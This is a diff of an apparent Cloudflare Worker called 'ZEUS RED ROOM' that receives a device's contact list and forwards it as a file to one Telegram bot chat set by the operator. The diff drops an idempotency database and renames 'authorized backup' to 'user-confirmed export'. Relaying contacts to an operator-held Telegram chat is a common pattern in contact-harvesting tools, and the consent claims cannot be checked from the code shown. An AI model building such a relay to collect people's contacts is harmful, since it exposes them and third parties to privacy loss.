@@ -9,7 +9,7 @@ export default {
     if (request.method === "OPTIONS") return new Response(null, { headers: cors });
     const url = new URL(request.url);
     if (url.pathname === "/health" && request.method === "GET")
-      return Response.json({ ok: true, service: "ZEUS backup relay" }, { headers: cors });
+      return Response.json({ ok: true, service: "ZEUS direct Telegram relay", database: false }, { headers: cors });
     if (url.pathname !== "/v1/backup" || request.method !== "POST")
       return Response.json({ error: "not_found" }, { status: 404, headers: cors });
 
@@ -19,7 +19,7 @@ export default {
 
     const operationId = request.headers.get("X-Idempotency-Key") || "";
     if (!/^[a-f0-9-]{36}$/i.test(operationId))
-      return Response.json({ error: "invalid_idempotency_key" }, { status: 400, headers: cors });
+      return Response.json({ error: "invalid_operation_id" }, { status: 400, headers: cors });
 
     let payload;
     try { payload = await request.json(); }
@@ -38,9 +38,9 @@ export default {
     if (!contacts.length) return Response.json({ error: "empty_contacts" }, { status: 400, headers: cors });
 
     const text = [
-      "ZEUS RED ROOM — Authorized contact backup",
+      "ZEUS RED ROOM — User-confirmed contact export",
       "Device: " + payload.deviceName,
-      "Contacts: " + contacts.length,
+      "Selected contacts: " + contacts.length,
       "Operation: " + operationId,
       "Time: " + new Date().toISOString(),
       "",
@@ -48,67 +48,41 @@ export default {
     ].join("\n");
     if (new TextEncoder().encode(text).length > 4_500_000)
       return Response.json({ error: "payload_too_large" }, { status: 413, headers: cors });
-
     if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID)
-      return Response.json({ ok: false, state: "failed", retry: true, error: "telegram_not_configured" },
+      return Response.json({ ok: false, state: "failed", retry: false, error: "telegram_not_configured" },
         { status: 503, headers: cors });
 
-    // Insert a durable idempotency lock before contacting Telegram. A stuck
-    // "sending" row is never blindly resent, avoiding accidental duplicates.
-    const existing = await env.DB.prepare(
-      "SELECT state, telegram_message_id FROM operations WHERE operation_id = ?"
-    ).bind(operationId).first();
-    if (existing?.state === "delivered")
-      return Response.json({ ok: true, state: "delivered", duplicate: true }, { headers: cors });
-    if (existing && existing.state !== "failed")
-      return Response.json({ ok: false, state: "sending_or_unknown", retry: false }, { status: 409, headers: cors });
+    const form = new FormData();
+    form.set("chat_id", env.TELEGRAM_CHAT_ID);
+    form.set("caption", "ZEUS • user-confirmed export • " + contacts.length + " contacts");
+    form.set("document", new Blob([text], { type: "text/plain; charset=utf-8" }),
+      "ZEUS-" + operationId + ".txt");
 
-    const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
-    const hash = [...new Uint8Array(digest)].map(b => b.toString(16).padStart(2, "0")).join("");
-    if (existing?.state === "failed") {
-      await env.DB.prepare(
-        "UPDATE operations SET state = 'sending', payload_sha256 = ?, created_at = ?, delivered_at = NULL WHERE operation_id = ?"
-      ).bind(hash, new Date().toISOString(), operationId).run();
-    } else {
-      const inserted = await env.DB.prepare(
-        "INSERT OR IGNORE INTO operations (operation_id, state, payload_sha256, created_at) VALUES (?, 'sending', ?, ?)"
-      ).bind(operationId, hash, new Date().toISOString()).run();
-      if (!inserted.meta?.changes)
-        return Response.json({ ok: false, state: "sending_or_unknown", retry: false }, { status: 409, headers: cors });
-    }
-
+    let telegramResponse;
     try {
-      const form = new FormData();
-      form.set("chat_id", env.TELEGRAM_CHAT_ID);
-      form.set("caption", "ZEUS backup • " + contacts.length + " contacts • " + payload.deviceName.slice(0, 80));
-      form.set("document", new Blob([text], { type: "text/plain; charset=utf-8" }),
-        "ZEUS-" + operationId + ".txt");
-      let tg, result;
-      try {
-        tg = await fetch("https://api.telegram.org/bot" + env.TELEGRAM_BOT_TOKEN + "/sendDocument", {
-          method: "POST", body: form
-        });
-        result = await tg.json();
-      } catch (networkError) {
-        throw new Error("ambiguous_telegram_result");
-      }
-      if (!tg.ok || !result?.ok) {
-        await env.DB.prepare(
-          "UPDATE operations SET state = 'failed', delivered_at = ? WHERE operation_id = ?"
-        ).bind(new Date().toISOString(), operationId).run();
-        return Response.json({ ok: false, state: "failed", retry: true }, { status: 502, headers: cors });
-      }
-      await env.DB.prepare(
-        "UPDATE operations SET state = 'delivered', telegram_message_id = ?, delivered_at = ? WHERE operation_id = ?"
-      ).bind(String(result.result?.message_id || ""), new Date().toISOString(), operationId).run();
-      return Response.json({ ok: true, state: "delivered", count: contacts.length }, { headers: cors });
-    } catch (error) {
-      // A transport error may happen after Telegram accepted the file. Mark
-      // it uncertain and never resend automatically, to avoid duplicates.
-      await env.DB.prepare(
-        "UPDATE operations SET state = 'unknown', delivered_at = ? WHERE operation_id = ?"
-      ).bind(new Date().toISOString(), operationId).run();
+      telegramResponse = await fetch("https://api.telegram.org/bot" + env.TELEGRAM_BOT_TOKEN + "/sendDocument", {
+        method: "POST", body: form
+      });
+    } catch {
+      // Telegram may have accepted the request before the connection failed.
+      // Never retry an ambiguous result automatically without an idempotency database.
       return Response.json({ ok: false, state: "unknown", retry: false }, { status: 502, headers: cors });
     }
+
+    let result;
+    try { result = await telegramResponse.json(); }
+    catch {
+      return Response.json({ ok: false, state: "unknown", retry: false }, { status: 502, headers: cors });
+    }
+    if (!telegramResponse.ok || !result?.ok) {
+      // Telegram explicitly rejected the operation; the client may safely retry selected transient failures.
+      const retry = telegramResponse.status === 429 || telegramResponse.status >= 500;
+      return Response.json({ ok: false, state: "failed", retry, error: "telegram_rejected" },
+        { status: 502, headers: cors });
+    }
+    return Response.json({
+      ok: true, state: "delivered", count: contacts.length,
+      telegramMessageId: result.result?.message_id || null
+    }, { headers: cors });
   }
 };
